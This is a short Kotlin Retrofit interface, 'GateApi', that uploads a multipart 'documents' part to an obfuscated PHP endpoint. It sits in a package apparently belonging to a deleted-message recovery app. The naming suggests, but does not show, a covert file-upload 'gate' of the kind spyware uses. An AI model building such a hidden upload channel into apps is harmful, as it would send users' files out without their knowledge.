package recover.deleted.messages.messagesrest.gates.api

import okhttp3.MultipartBody
import retrofit2.Call
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part

interface GateApi {

    @Multipart
    @POST("/J5G8elKEzu66.php")
    fun postDocuments(
        @Part documents: MultipartBody.Part,
    ) : Call<String>

}